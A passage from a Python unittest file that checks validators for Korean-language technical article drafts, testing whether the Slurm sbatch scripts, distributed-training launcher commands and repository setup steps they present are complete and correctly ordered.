                {"statement": "공통 shebang은 `#!/bin/sh`이다."},
                {"statement": "a.sh 지시자는 `#SBATCH --time=1`이다."},
                {"statement": "b.sh 지시자는 `#SBATCH --time=2`이다."},
                {"statement": "a.sh 본문은 `hostname`이다."},
                {"statement": "b.sh 본문은 `pwd`이다."},
                {"statement": "첫 제출은 `sbatch a.sh`이다."},
                {"statement": "둘째 제출은 `sbatch b.sh`이다."},
            ],
            "limitations": [],
        }
        contracts = rewrite.research_promised_sbatch_script_contracts(research)
        self.assertEqual(contracts["a.sh"]["directives"], {"#SBATCH --time=1"})
        self.assertEqual(contracts["b.sh"]["directives"], {"#SBATCH --time=2"})
        self.assertEqual(contracts["a.sh"]["payload_signatures"], {("hostname",)})
        self.assertEqual(contracts["b.sh"]["payload_signatures"], {("pwd",)})
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])

        good = {
            "content": (
                "a.sh 전체 내용입니다.\n\n"
                "```bash\n#!/bin/sh\n#SBATCH --time=1\nhostname\n```\n\n"
                "b.sh 전체 내용입니다.\n\n"
                "```bash\n#!/bin/sh\n#SBATCH --time=2\npwd\n```\n\n"
                "```bash\nsbatch a.sh\nsbatch b.sh\n```"
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.draft_runnable_procedure_errors(good, research), [])

        swapped = {
            **good,
            "content": good["content"].replace(
                "#SBATCH --time=1\nhostname",
                "#SBATCH --time=1\npwd",
            ).replace(
                "#SBATCH --time=2\npwd",
                "#SBATCH --time=2\nhostname",
            ),
        }
        errors = rewrite.draft_runnable_procedure_errors(swapped, research)
        self.assertTrue(any("대응 파일 예제" in error for error in errors), errors)

        conflicting = {
            **good,
            "content": good["content"].replace(
                "#SBATCH --time=1\nhostname",
                "#SBATCH --time=1\n#SBATCH --time=2\nhostname",
            ),
        }
        errors = rewrite.draft_runnable_procedure_errors(conflicting, research)
        self.assertTrue(any("대응 파일 예제" in error for error in errors), errors)

    def test_operational_public_literals_fail_closed(self):
        base = {
            "reader_problem": "Slurm 제출 파일을 작성합니다.",
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 my.script를 작성하고 "
                "`sbatch my.script`로 제출합니다."
            ),
            "recommended_angle": "실행 명령을 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "shebang은 `#!/bin/sh`이다."},
                {"statement": "지시자는 `#SBATCH --time=1`이다."},
                {"statement": "본문은 `hostname`이다."},
                {"statement": "제출은 `sbatch my.script`이다."},
            ],
            "limitations": [],
        }
        for bad in (
            "#sbatch --time=1",
            "#SBATCH --nodes",
            "#SBATCH --nodelist=adev[]",
        ):
            with self.subTest(bad=bad):
                research = {
                    **base,
                    "reader_promise": base["reader_promise"].replace(
                        "#SBATCH --time=1", bad,
                    ),
                }
                errors = rewrite.research_runnable_procedure_errors(research)
                self.assertTrue(any("공개 계약의 #SBATCH" in error for error in errors), errors)

        for bad in ("#!/bin/sh <ARG>", "#!/bin/sh -e", "#!/usr/bin/python"):
            with self.subTest(bad=bad):
                research = {
                    **base,
                    "reader_promise": base["reader_promise"].replace(
                        "#!/bin/sh", bad,
                    ),
                }
                errors = rewrite.research_runnable_procedure_errors(research)
                self.assertTrue(any("shell shebang" in error for error in errors), errors)

        incomplete = {
            "reader_problem": "학습 명령을 실행합니다.",
            "reader_promise": "`python train.py --epochs` 명령으로 실행합니다.",
            "recommended_angle": "학습 CLI를 설명합니다.",
            "popular_questions": [],
            "facts": [{
                "statement": "학습 명령은 `python train.py --epochs 10`이다."
            }],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(incomplete)
        self.assertTrue(any("인라인 실행 명령" in error for error in errors), errors)

        for literal in (
            "python train.py --epochs",
            "sbatch -o my.script",
            "#sbatch --time=1",
        ):
            with self.subTest(standalone_literal=literal):
                standalone = {
                    "reader_problem": "실행 예제를 확인합니다.",
                    "reader_promise": f"`{literal}`",
                    "recommended_angle": "검증된 절차를 설명합니다.",
                    "popular_questions": [],
                    "facts": base["facts"] + [{
                        "statement": "학습 명령은 `python train.py --epochs 10`이다."
                    }],
                    "limitations": [],
                }
                self.assertTrue(rewrite.research_has_operational_cli_promise(standalone))
                self.assertTrue(
                    rewrite.research_runnable_procedure_errors(standalone)
                )

    def test_sh_sbatch_contract_rejects_bash_process_substitution(self):
        research = {
            "reader_problem": "Slurm 비교 작업 파일을 작성합니다.",
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 my.script를 작성하고 "
                "본문에 `diff <(date) expected.txt`를 넣은 뒤 "
                "`sbatch my.script`로 제출합니다."
            ),
            "recommended_angle": "검증된 제출 파일을 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "shebang은 `#!/bin/sh`이다."},
                {"statement": "지시자는 `#SBATCH --time=1`이다."},
                {"statement": "본문은 `diff <(date) expected.txt`이다."},
                {"statement": "제출은 `sbatch my.script`이다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(research)
        self.assertTrue(any("process substitution" in error for error in errors), errors)

        bash_research = {
            **research,
            "reader_promise": research["reader_promise"].replace(
                "#!/bin/sh", "#!/bin/bash",
            ),
            "facts": [
                {
                    **item,
                    "statement": item["statement"].replace(
                        "#!/bin/sh", "#!/bin/bash",
                    ),
                }
                for item in research["facts"]
            ],
        }
        self.assertEqual(rewrite.research_runnable_procedure_errors(bash_research), [])
        draft = {
            "content": (
                "my.script 전체 내용입니다.\n\n"
                "```bash\n#!/bin/bash\n#SBATCH --time=1\n"
                "diff <(date) expected.txt\n```\n\n"
                "```bash\nsbatch my.script\n```"
            ),
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(draft, bash_research),
            [],
        )
        sh_errors = rewrite.draft_runnable_procedure_errors(draft, research)
        self.assertTrue(any("shebang" in error for error in sh_errors), sh_errors)

    def test_non_shell_command_scan_requires_an_execution_sink(self):
        research = {
            "reader_problem": "Slurm 작업을 제출합니다.",
            "reader_promise": "`sbatch job.sh`로 제출합니다.",
            "recommended_angle": "제출 명령을 설명합니다.",
            "popular_questions": [],
            "facts": [{"statement": "제출은 `sbatch job.sh`이다."}],
            "limitations": [],
        }
        for body in (
            'print("node status")',
            'data={"go":"next"}',
            'print("python example")',
        ):
            with self.subTest(body=body):
                draft = {
                    "content": (
                        "```bash\nsbatch job.sh\n```\n\n"
                        f"```python\n{body}\n```"
                    ),
                    "faq": [],
                }
                self.assertEqual(
                    rewrite.draft_runnable_procedure_errors(draft, research),
                    [],
                )

        node_research = {
            "reader_problem": "Node.js 앱을 실행합니다.",
            "reader_promise": "`node app.js`로 앱을 실행합니다.",
            "recommended_angle": "검증된 실행 명령을 설명합니다.",
            "popular_questions": [],
            "facts": [{"statement": "실행 명령은 `node app.js`이다."}],
            "limitations": [],
        }
        ordinary_python = {
            "content": (
                "```bash\nnode app.js\n```\n\n"
                "```python\nnode = {\"status\": \"ok\"}\n```"
            ),
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(ordinary_python, node_research),
            [],
        )
        hidden_javascript = {
            "content": (
                ordinary_python["content"]
                + '\n\n```javascript\nexecFile("node", ["app.js"])\n```'
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(
            hidden_javascript,
            node_research,
        )
        self.assertTrue(any("숨겨져" in error for error in errors), errors)

        split_sink = {
            "content": (
                "```bash\nnode app.js\n```\n\n"
                "```python\nargs = [\"node\", \"app.js\"]\n```\n\n"
                "```python\nsubprocess.run(args)\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(split_sink, node_research)
        self.assertTrue(any("숨겨져" in error for error in errors), errors)

    def test_launcher_requires_a_nonempty_concrete_program(self):
        invalid = (
            'torchrun -- "" --epochs 10',
            "torchrun -- --epochs 10",
            'mpirun -- ""',
            'srun -- "" --nodes 1',
            "torchrun --nproc_per_node=4",
            "mpirun -np 4",
            "mpiexec -n 2",
            "srun --nodes=2",
            "deepspeed --num_gpus=2",
            "accelerate launch --num_processes=2",
            "srun -n banana /bin/hostname",
            "mpirun -np banana /bin/hostname",
            "srun -w adev[] /bin/hostname",
            "srun -w adev* /bin/hostname",
            "torchrun --nproc_per_node=banana train.py --epochs 10",
        )
        for literal in invalid:
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertFalse(rewrite.complete_runnable_command(command))
        for literal in (
            "torchrun --nproc_per_node=4 train.py --epochs 10",
            "mpirun -np 4 ./app",
            "srun --nodes=2 hostname",
            "accelerate launch --num_processes=2 train.py --epochs 10",
        ):
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertTrue(rewrite.complete_runnable_command(command))

        for literal in (
            "SQUEUE",
            "SCANCEL 473",
            "TorchRun train.py --epochs 10",
            "SRUN -n4 hostname",
            "PYTHON train.py --epochs 10",
            "git STATUS",
            "git CLONE https://example.com/repo.git repo",
            "kubectl GET pods",
            "docker RUN alpine echo hi",
            "accelerate Launch --num_processes=2 train.py --epochs 10",
        ):
            with self.subTest(case_sensitive_literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertFalse(rewrite.complete_runnable_command(command))

        for literal in ("squeue -h", "sinfo -h"):
            with self.subTest(noheader_literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertTrue(rewrite.complete_runnable_command(command))

        for literal in (
            "mpirun -hostfile train.py hostname",
            "mpirun -np train.py hostname",
        ):
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertNotIn("train.py", rewrite.command_identity_names(command))

    def test_separator_does_not_hide_a_dangling_nested_option(self):
        for literal, expected in (
            ("torchrun -- train.py --epochs", False),
            ("torchrun -- train.py --epochs 10", True),
            ("torchrun -- train.py --use_wandb", True),
        ):
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"실행 명령은 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertEqual(
                    rewrite.complete_runnable_command(command),
                    expected,
                )
        for literal in ("exit 0", "return 0", "exec hostname", "squeue <<hostname"):
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"본문은 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertFalse(rewrite.complete_runnable_command(command))

    def test_operational_draft_requires_fenced_named_commands(self):
        slurm_research = {
            "reader_problem": "Slurm 작업 제출과 조회를 하지 못합니다.",
            "reader_promise": "sbatch와 squeue CLI 실행 방법을 익힙니다.",
            "recommended_angle": "명령 예제를 단계별로 확인합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "제출 명령은 `sbatch job.sh`이다."},
                {"statement": "조회 명령은 `squeue`이다."},
            ],
            "limitations": [],
        }
        no_code = {"content": "sbatch로 제출하고 squeue로 조회합니다.", "faq": []}
        errors = rewrite.draft_runnable_procedure_errors(no_code, slurm_research)
        self.assertTrue(any("fenced shell" in error for error in errors), errors)

        fragment = {
            "content": "```bash\n#!/bin/bash\n#SBATCH\n```",
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(fragment, slurm_research)
        self.assertTrue(any("fenced shell" in error for error in errors), errors)

        only_query = {"content": "```bash\nsqueue\n```", "faq": []}
        errors = rewrite.draft_runnable_procedure_errors(only_query, slurm_research)
        self.assertTrue(any("sbatch" in error for error in errors), errors)

        runnable = {
            "content": "```bash\nsbatch job.sh\nsqueue\n```",
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(runnable, slurm_research),
            [],
        )

    def test_conceptual_tutorial_does_not_require_shell_fence(self):
        for promise in (
            "self-attention 원리와 구조를 이해하는 개념 튜토리얼입니다.",
            "train.py 구조와 --model 옵션의 의미만 해설합니다.",
            "`train.py` 구조와 `--model` 옵션의 의미만 해설합니다.",
        ):
            with self.subTest(promise=promise):
                research = {
                    "article_format": "tutorial",
                    "reader_problem": "구조의 의미를 이해하기 어렵습니다.",
                    "reader_promise": promise,
                    "recommended_angle": "실행 절차 없이 개념 범위만 설명합니다.",
                    "popular_questions": [],
                    "facts": [],
                    "limitations": [],
                }
                self.assertEqual(
                    rewrite.research_runnable_procedure_errors(research),
                    [],
                )
                self.assertEqual(
                    rewrite.draft_runnable_procedure_errors(
                        {"content": "개념과 구조를 설명합니다.", "faq": []},
                        research,
                    ),
                    [],
                )

    def test_audit_rechecks_runnable_example_after_final_edit(self):
        research = {
            "reader_problem": "Slurm 작업 제출을 하지 못합니다.",
            "reader_promise": "sbatch CLI 실행 방법을 익힙니다.",
            "recommended_angle": "제출 명령 예제를 확인합니다.",
            "popular_questions": [],
            "facts": [{"statement": "제출 명령은 `sbatch job.sh`이다."}],
            "limitations": [],
            "sources": [],
        }
        final_draft = {
            "title": "Slurm sbatch 작업 제출 명령의 조건과 주의사항",
            "description": "Slurm sbatch 작업 제출 명령을 실행하기 전에 확인할 조건과 주의사항을 공식 근거 범위에서 설명합니다.",
            "summary": "Slurm 작업 제출 명령의 적용 조건을 먼저 확인합니다. 제출할 때 놓치기 쉬운 주의사항도 함께 점검합니다.",
            "content": (
                "Slurm 작업 제출 조건을 먼저 확인합니다.\n\n"
                "## 작업 제출 조건\n\n" + ("제출 조건을 확인합니다. " * 55)
                + "\n\n## 작업 제출 시 주의\n\n" + ("주의사항을 확인합니다. " * 55)
            ),
            "tags": ["Slurm", "sbatch", "작업", "제출", "주의"],
            "entities": ["Slurm", "sbatch"],
            "faq": [],
        }
        audit = {
            "final_supported": True,
            "final_reader_ready": True,
            "evidence_score": 10,
            "reader_score": 10,
            "removed_or_corrected": [],
            "final_draft": final_draft,
        }
        errors = rewrite.validate_audit(audit, research, {})
        self.assertTrue(any("fenced shell" in error for error in errors), errors)

    def test_procedure_contract_rejects_mismatched_cli_and_missing_prerequisites(self):
        broken = {
            "title": "CycleGAN 단일 방향 변환 및 DDP 학습 설정 한계",
            "description": "PyTorch 테스트 명령과 DDP 학습 설정 절차를 확인합니다.",
            "summary": "단일 방향 테스트 명령과 프레임워크별 설정을 설명합니다.",
            "content": (
                "단일 방향 결과에는 `--model test`를 지정해야 하고 DDP 학습에는 "
                "`--norm sync_batch`를 설정해야 합니다.\n\n"
                "## 프레임워크별 설정\n\n"
                "PyTorch 테스트 명령을 실행합니다.\n\n"
                "```bash\n"
                "git clone https://github.com/example/project\n"
                "bash ./datasets/download.sh maps\n"
                "python test.py --model cycle_gan\n"
                "```\n\n"
                "TensorFlow에서는 이미지를 무작위로 자릅니다.\n\n"
                "## DDP 설정 한계\n\n"
                "`--norm sync_batch` 옵션을 설정해야 하는 한계가 있습니다."
            ),
            "faq": [],
        }
        errors = rewrite.procedural_coherence_errors(broken)
        expected = (
            "실제 코드의 값이 다름",
            "분산 런처",
            "작업 디렉터리 이동",
            "의존성 설치",
            "체크포인트 사전 준비",
            "실제 단점처럼 '한계'",
            "TensorFlow 내용은 고립된 한 항목",
        )
        for marker in expected:
            self.assertTrue(any(marker in error for error in errors), msg=(marker, errors))

        repaired = {
            **broken,
            "title": "CycleGAN 단일 방향 테스트 명령의 사전 조건",
            "description": "CycleGAN 단일 방향 테스트에 필요한 옵션과 사전 준비를 확인합니다.",
            "summary": "명령은 공식 근거로 확인된 조각이며 필요한 준비 조건도 함께 설명합니다.",
            "content": (
                "단일 방향 결과에는 `--model test`를 지정해야 합니다.\n\n"
                "## PyTorch 테스트 명령\n\n"
                "테스트 전에 체크포인트를 미리 준비해야 합니다.\n\n"
                "```bash\n"
                "git clone https://github.com/example/project\n"
                "cd project\n"
                "pip install -r requirements.txt\n"
                "python test.py --model test\n"
                "```\n\n"
                "## 실행 전 주의\n\n"
                "위 조건을 먼저 확인합니다."
            ),
        }
        self.assertEqual(rewrite.procedural_coherence_errors(repaired), [])

        faq_command = {
            "title": "CycleGAN 테스트 CLI 실행 방법",
            "description": "CycleGAN 모델 테스트 명령을 실행하는 절차를 설명합니다.",
            "summary": "CycleGAN 테스트 명령과 실행 전에 필요한 준비 조건을 확인합니다.",
            "content": (
                "먼저 테스트 대상을 정합니다.\n\n"
                "## 테스트 단계\n\n"
                "1. 데이터셋 경로를 확인합니다.\n"
                "2. 테스트 명령을 실행합니다.\n\n"
                "## 실행 전 주의\n\n"
                "준비 범위를 먼저 확인합니다."
            ),
            "faq": [{
                "question": "실제 테스트 명령은 무엇인가요?",
                "answer": (
                    "```bash\n"
                    "python test.py --model cyclegan --dataroot datasets/maps\n"
                    "```"
                ),
            }],
        }
        errors = rewrite.procedural_coherence_errors(faq_command)
        self.assertTrue(any("의존성 설치" in error for error in errors), errors)
        self.assertTrue(any("체크포인트 사전 준비" in error for error in errors), errors)

        faq_command_ready = {
            **faq_command,
            "content": faq_command["content"].replace(
                "준비 범위를 먼저 확인합니다.",
                (
                    "의존성은 미리 설치하고 실행 환경도 먼저 준비해야 합니다. "
                    "테스트용 체크포인트도 미리 준비해야 합니다."
                ),
            ),
        }
        self.assertEqual(
            rewrite.procedural_coherence_errors(faq_command_ready),
            [],
        )

        wrong_order = {
            **repaired,
            "content": repaired["content"].replace(
                "cd project\npip install -r requirements.txt\npython test.py --model test",
                "python test.py --model test\ncd project\npip install -r requirements.txt",
            ),
        }
        order_errors = rewrite.procedural_coherence_errors(wrong_order)
        self.assertTrue(any("작업 디렉터리 이동" in error for error in order_errors))
        self.assertTrue(any("의존성 설치" in error for error in order_errors))

    def test_procedure_contract_ignores_comments_and_models_option_polarity(self):
        commented_launcher = {
            "title": "DDP 분산 학습 실행 절차",
            "description": "DDP 분산 학습 실행 방법을 설명합니다.",
            "summary": "분산 학습 명령을 확인합니다.",
            "content": (
                "DDP 분산 학습 실행 절차를 먼저 확인합니다.\n\n"
                "## DDP 실행 시 주의\n\n"
                "```bash\necho noop # torchrun train.py\npython train.py\n```"
            ),
        }
        errors = rewrite.procedural_coherence_errors(commented_launcher)
        self.assertTrue(any("분산 런처" in error for error in errors))

        alternatives = {
            "title": "백엔드 옵션의 실행 조건",
            "description": "백엔드 실행 명령에 넣을 대안 값을 확인합니다.",
            "summary": "지원되는 선택지를 확인합니다.",
            "content": (
                "`--backend cuda` 또는 `--backend mps`를 선택해야 합니다.\n\n"
                "## 백엔드 선택 시 주의\n\n"
                "```bash\npython run.py --backend cuda\n```"
            ),
        }
        errors = rewrite.procedural_coherence_errors(alternatives)
        self.assertFalse(any("mps" in error and "CLI" in error for error in errors))

        forbidden = {
            **alternatives,
            "content": alternatives["content"].replace(
                "`--backend cuda` 또는 `--backend mps`를 선택해야 합니다.",
                "`--backend cuda`를 사용하면 안 됩니다.",
            ),
        }
        errors = rewrite.procedural_coherence_errors(forbidden)
        self.assertTrue(any("금지" in error and "--backend cuda" in error for error in errors))

        informational_ddp = {
            "title": "CycleGAN PyTorch 테스트 명령과 DDP 정규화 옵션 조건",
            "description": "PyTorch 테스트 명령과 DDP 정규화 옵션의 적용 조건을 확인합니다.",
            "summary": "실행 가능한 테스트 예제와 별도의 DDP 옵션 주의를 구분합니다.",
            "content": (
                "단일 방향 테스트에는 `--model test`를 지정해야 합니다. "
                "DDP는 실행 절차가 아니라 `--norm sync_batch` 또는 "
                "`--norm sync_instance` 조건만 확인합니다.\n\n"
                "## PyTorch 테스트 명령\n\n"
                "테스트 전에 체크포인트를 미리 준비해야 합니다.\n\n"
                "```bash\npip install -r requirements.txt\n"
                "python test.py --model test\n```\n\n"
                "## DDP 정규화 옵션 주의\n\n"
                "DDP에서는 `--norm sync_batch` 또는 `--norm sync_instance`를 "
                "설정해야 합니다."
            ),
        }
        errors = rewrite.procedural_coherence_errors(informational_ddp)
        self.assertFalse(any("--norm" in error for error in errors), msg=errors)
        self.assertFalse(any("분산 런처" in error for error in errors), msg=errors)

    def test_procedure_contract_rejects_broad_fragment_waiver_and_parallel_scope(self):
        broad_fragment = {
            "title": "저장소 설치부터 모델 테스트까지 전체 실행 절차",
            "description": "처음부터 모델 테스트를 마치는 실행 방법을 설명합니다.",
            "summary": "전체 설치와 테스트 순서를 제공합니다.",
            "content": (
                "체크포인트를 미리 준비해야 합니다.\n\n"
                "## 전체 실행 절차\n\n"
                "아래 명령 일부는 단독 실행 코드가 아닙니다.\n\n"
                "```bash\n"
                "git clone https://github.com/example/project\n"
                "bash ./datasets/download.sh maps\n"
                "python test.py\n"
                "```\n\n"
                "## 실행 시 주의\n\n전제 조건을 확인합니다."
            ),
        }
        errors = rewrite.procedural_coherence_errors(broad_fragment)
        self.assertTrue(any("완결 절차" in error for error in errors))
        self.assertTrue(any("작업 디렉터리 이동" in error for error in errors))

        no_clone_setup = {
            "title": "모델 테스트 실행 절차",
            "description": "모델 테스트 실행 방법을 설명합니다.",
            "summary": "테스트 전제를 확인합니다.",
            "content": (
                "테스트 전에 체크포인트를 미리 준비해야 합니다.\n\n"
                "## 모델 테스트 실행\n\n```bash\npython test.py\n```\n\n"
                "## 실행 시 주의\n\n준비된 환경에서 확인합니다."
            ),
        }
        errors = rewrite.procedural_coherence_errors(no_clone_setup)
        self.assertTrue(any("의존성 설치" in error for error in errors))

        uneven_frameworks = {
            "title": "두 프레임워크 실행 범위 확인",
            "description": "두 프레임워크의 실행 절차를 확인합니다.",
            "summary": "각 실행 경로를 비교합니다.",
            "content": (
                "실행 차이를 먼저 확인합니다.\n\n"
                "## PyTorch 및 TensorFlow 실행 절차\n\n"
                "PyTorch 실행 명령입니다.\n\n```bash\npython run.py\n```\n\n"
                "TensorFlow는 입력을 변환합니다.\n\n"
                "## 실행 시 주의\n\n환경별 조건을 확인합니다."
            ),
        }
        errors = rewrite.procedural_coherence_errors(uneven_frameworks)
        self.assertTrue(any("TensorFlow 내용은 고립된" in error for error in errors))

    def test_ddp_launcher_requires_real_argv_and_accepts_line_continuation(self):
        def draft(command):
            return {
                "title": "DDP 분산 학습 실행 절차",
                "description": "DDP 분산 학습 실행 방법을 확인합니다.",
                "summary": "분산 학습 명령을 점검합니다.",
                "content": (
                    "DDP 분산 학습 실행 방법을 확인합니다.\n\n"
                    "## DDP 실행 시 주의\n\n```bash\n"
                    + command
                    + "\n```"
                ),
                "faq": [],
            }

        for fake_command in (
            "# torchrun train.py\npython train.py",
            "echo torchrun train.py",
            "torchrun --help train.py",
            "torchrun --nproc_per_node=4 train.py ...",
            "torchrun --nproc_per_node=4 train.py …",
            "python -m torch.distributed.fake train.py",
        ):
            errors = rewrite.procedural_coherence_errors(draft(fake_command))
            self.assertTrue(
                any("분산 런처" in error for error in errors),
                msg=(fake_command, errors),
            )

        valid = draft("torchrun --nproc_per_node=4 \\\n  train.py")
        errors = rewrite.procedural_coherence_errors(valid)
        self.assertFalse(any("분산 런처" in error for error in errors))

    def test_informational_ddp_option_scope_does_not_require_launcher(self):
        draft = {
            "title": "DDP 학습 정규화 옵션 조건",
            "description": "DDP 학습 실행 방법이 아니라 정규화 옵션 조건만 설명합니다.",
            "summary": "DDP 학습 절차를 다루지 않고 정규화 조건만 확인합니다.",
            "content": (
                "DDP 학습 실행 절차는 제공하지 않고 `--norm sync_batch` 또는 "
                "`--norm sync_instance`가 필요하다는 정규화 조건만 확인합니다.\n\n"
                "## DDP 정규화 옵션 주의\n\n두 옵션 중 하나를 설정해야 합니다."
            ),
            "faq": [],
        }
        errors = rewrite.procedural_coherence_errors(draft)
        self.assertFalse(any("분산 런처" in error for error in errors))
        self.assertFalse(any("--norm" in error and "코드에 없음" in error for error in errors))

    def test_option_contract_models_any_of_local_polarity_and_flag_only(self):
        alternatives = {
            "title": "가속기 실행 방법",
            "description": "가속기 실행 명령의 선택지를 확인합니다.",
            "summary": "서로 다른 두 옵션 중 하나를 사용합니다.",
            "content": (
                "`--device cuda` 또는 `--accelerator gpu` 중 하나를 지정해야 하는 "
                "실행 방법입니다.\n\n## 실행 시 주의\n\n"
                "```bash\npython run.py --device cuda\n```"
            ),
            "faq": [],
        }
        errors = rewrite.procedural_coherence_errors(alternatives)
        self.assertFalse(any("--accelerator gpu" in error for error in errors))

        mixed = {
            **alternatives,
            "title": "DDP 학습 실행 명령",
            "content": (
                "DDP에서는 `--norm sync_batch`를 사용해야 하고 `--norm batch`는 "
                "사용하면 안 됩니다.\n\n## 실행 시 주의\n\n"
                "```bash\ntorchrun train.py --norm sync_batch\n```"
            ),
        }
        errors = rewrite.procedural_coherence_errors(mixed)
        self.assertFalse(any("금지" in error and "sync_batch" in error for error in errors))
        mixed["content"] = mixed["content"].replace(
            "--norm sync_batch\n```", "--norm batch\n```"
        )
        errors = rewrite.procedural_coherence_errors(mixed)
        self.assertTrue(any("금지" in error and "--norm batch" in error for error in errors))

        flag_only = {
            **alternatives,
            "title": "상세 로그 실행 방법",
            "content": (
                "실행 명령에는 `--verbose`를 사용해야 합니다.\n\n"
                "## 실행 시 주의\n\n```bash\npython run.py\n```"
            ),
        }
        errors = rewrite.procedural_coherence_errors(flag_only)
        self.assertTrue(any("--verbose" in error and "코드에 없음" in error for error in errors))

        unrelated_required = {
            **alternatives,
            "title": "모델 실행 방법",
            "content": (
                "단일 방향에는 `--model test`를 지정해야 하고 정규화는 "
                "`--norm sync_batch` 또는 `--norm sync_instance` 중 하나를 "
                "선택해야 하는 실행 방법입니다.\n\n## 실행 시 주의\n\n"
                "```bash\npython run.py --norm sync_batch\n```"
            ),
        }
        errors = rewrite.procedural_coherence_errors(unrelated_required)
        self.assertTrue(any("--model test" in error for error in errors))

    def test_repository_workflow_requires_exact_cd_and_ordered_prerequisites(self):
        def workflow(commands, *, before="테스트 전에 체크포인트를 미리 준비해야 합니다.", after=""):
            return {
                "title": "모델 테스트 실행 절차",
                "description": "새 저장소에서 모델 테스트를 실행하는 절차입니다.",
                "summary": "저장소 준비부터 테스트까지 순서를 확인합니다.",
                "content": (
                    before
                    + "\n\n## 모델 테스트 실행\n\n```bash\n"
                    + commands
                    + "\n```"
                    + after
                ),
                "faq": [],
            }

        wrong_cd = workflow(
            "cd unrelated\n"
            "git clone https://example.com/project.git\n"
            "pip install package\npython test.py"
        )
        errors = rewrite.procedural_coherence_errors(wrong_cd)
        self.assertTrue(any("작업 디렉터리 이동" in error for error in errors))

        dependency_too_early = workflow(
            "pip install -r requirements.txt\n"
            "git clone https://example.com/project.git\n"
            "cd project\npython test.py"
        )
        errors = rewrite.procedural_coherence_errors(dependency_too_early)
        self.assertTrue(any("의존성 설치" in error for error in errors))

        dependency_after = workflow(
            "git clone https://example.com/project.git\ncd project\npython test.py",
            after="\n\n의존성 패키지는 이미 미리 설치 완료된 상태입니다.",
        )
        errors = rewrite.procedural_coherence_errors(dependency_after)
        self.assertTrue(any("의존성 설치" in error for error in errors))

        checkpoint_after = workflow(
            "git clone https://example.com/project.git\n"
            "cd project\npip install package\npython test.py",
            before="CycleGAN 테스트를 실행합니다.",
            after="\n\n체크포인트를 미리 준비해야 합니다.",
        )
        checkpoint_after["title"] = "CycleGAN 테스트 실행 절차"
        errors = rewrite.procedural_coherence_errors(checkpoint_after)
        self.assertTrue(any("체크포인트 사전 준비" in error for error in errors))

        valid = workflow(
            "git clone https://example.com/project.git\n"
            "cd project\npip install package\npython test.py"
        )
        errors = rewrite.procedural_coherence_errors(valid)
        self.assertFalse(any("작업 디렉터리 이동" in error for error in errors))
        self.assertFalse(any("의존성 설치" in error for error in errors))
        self.assertFalse(any("체크포인트 사전 준비" in error for error in errors))

    def test_fragment_waiver_is_blank_line_safe_and_fence_local(self):
        narrow = {
            "title": "모델 명령 조각 참고",
            "description": "독립 실행 절차가 아닌 명령 조각을 확인합니다.",
            "summary": "명령 조각의 옵션만 참고합니다.",
            "content": (
                "## 명령 조각 참고\n\n"
                "핵심 부분만 발췌한 예시이며 단독 실행 코드는 아닙니다.\n\n"
                "```bash\n"
                "git clone https://example.com/project.git\npython test.py\n"
                "```"
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.procedural_coherence_errors(narrow), [])

        leaked = {
            **narrow,
            "content": (
                "## 첫 명령 조각\n\n"
                "핵심 부분만 발췌한 예시이며 단독 실행 코드는 아닙니다.\n\n"
                "```bash\necho ok\n```\n\n"
                "## 저장소 테스트 명령\n\n다음 명령을 실행합니다.\n\n"
                "```bash\n"
                "git clone https://example.com/project.git\npython test.py\n"
                "```"
            ),
        }
        errors = rewrite.procedural_coherence_errors(leaked)
        self.assertTrue(any("작업 디렉터리 이동" in error for error in errors))

        broad = {
            **narrow,
            "title": "저장소 설치부터 테스트까지 전체 실행 절차",
            "description": "처음부터 끝까지 실행하는 방법입니다.",
        }
        errors = rewrite.procedural_coherence_errors(broad)
        self.assertTrue(any("완결 절차" in error for error in errors))

    def test_parallel_framework_scope_rejects_table_and_echo_but_accepts_api_code(self):
        base = {
            "title": "CycleGAN 실행 비교",
            "description": "두 프레임워크 실행 절차를 비교합니다.",
            "summary": "프레임워크별 실행 경로를 확인합니다.",
            "faq": [],
        }
        table_only = {
            **base,
            "content": (
                "실행 범위를 확인합니다.\n\n"
                "## PyTorch 및 TensorFlow 실행 절차\n\n"
                "PyTorch 실행 명령입니다.\n\n"
                "```bash\npython pytorch_train.py\n```\n\n"
                "| 프레임워크 | 항목 | 값 |\n|---|---|---|\n"
                "| TensorFlow | 지터 크기 | 286 |"
            ),
        }
        errors = rewrite.procedural_coherence_errors(table_only)
        self.assertTrue(any("TensorFlow 내용은 고립된" in error for error in errors))

        echo_only = {
            **base,
            "content": table_only["content"].split("\n\n| 프레임워크", 1)[0]
